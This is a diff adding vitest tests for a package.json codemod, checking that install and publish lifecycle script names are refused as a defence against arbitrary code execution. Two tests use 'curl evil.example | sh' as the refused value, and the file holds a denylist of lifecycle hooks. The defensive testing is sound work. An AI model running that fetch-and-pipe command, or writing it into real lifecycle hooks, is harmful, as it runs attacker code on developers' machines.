@@ -1,5 +1,8 @@
 import { describe, expect, it } from "vitest";
-import { upsertPackageJsonScript } from "./pkg-json-script.js";
+import {
+  packageJsonScriptRefusal,
+  upsertPackageJsonScript,
+} from "./pkg-json-script.js";
 
 const PACKAGE_JSON = `{
   "name": "@repo/api",
@@ -122,5 +125,71 @@ describe(upsertPackageJsonScript, () => {
     expect(
       upsertPackageJsonScript("", { name: "clean", value: "rimraf dist" })
     ).toBe("");
+  });
+});
+
+// #98 Phase 1. A descriptor comes from a registry the user may not control, and npm/pnpm
+// run these keys on their own at install or publish time. Landing one is arbitrary code
+// execution on the next `pnpm install`, so the codemod refuses instead of upserting.
+describe("upsertPackageJsonScript — install-lifecycle denylist", () => {
+  const LIFECYCLE = [
+    "preinstall",
+    "install",
+    "postinstall",
+    "prepare",
+    "prepublish",
+    "prepublishOnly",
+  ];
+
+  it.each(LIFECYCLE)("leaves %s unwritten", (name) => {
+    expect(
+      upsertPackageJsonScript(PACKAGE_JSON, {
+        name,
+        value: "curl evil.example | sh",
+      })
+    ).toBe(PACKAGE_JSON);
+  });
+
+  it.each(LIFECYCLE)("reports %s as a named refusal", (name) => {
+    const reason = packageJsonScriptRefusal(PACKAGE_JSON, {
+      name,
+      value: "curl evil.example | sh",
+    });
+    expect(reason).toContain(name);
+    expect(reason).toMatch(/install|publish/);
+  });
+
+  it("does not refuse an ordinary script name", () => {
+    expect(
+      packageJsonScriptRefusal(PACKAGE_JSON, {
+        name: "db:generate",
+        value: "drizzle-kit generate",
+      })
+    ).toBeUndefined();
+  });
+
+  it("does not refuse a name that merely contains a lifecycle word", () => {
+    const out = upsertPackageJsonScript(NO_SCRIPTS, {
+      name: "installer:check",
+      value: "node ./check.js",
+    });
+    const parsed = JSON.parse(out) as { scripts: Record<string, string> };
+    expect(parsed.scripts).toStrictEqual({
+      "installer:check": "node ./check.js",
+    });
+  });
+
+  it("stays inside the scripts map: no sibling key is created or moved", () => {
+    const out = upsertPackageJsonScript(PACKAGE_JSON, {
+      name: "db:generate",
+      value: "drizzle-kit generate",
+    });
+    const parsed = JSON.parse(out) as Record<string, unknown>;
+    expect(Object.keys(parsed)).toStrictEqual([
+      "name",
+      "scripts",
+      "dependencies",
+    ]);
+    expect(parsed.dependencies).toStrictEqual({ hono: "4.12.31" });
   });
 });
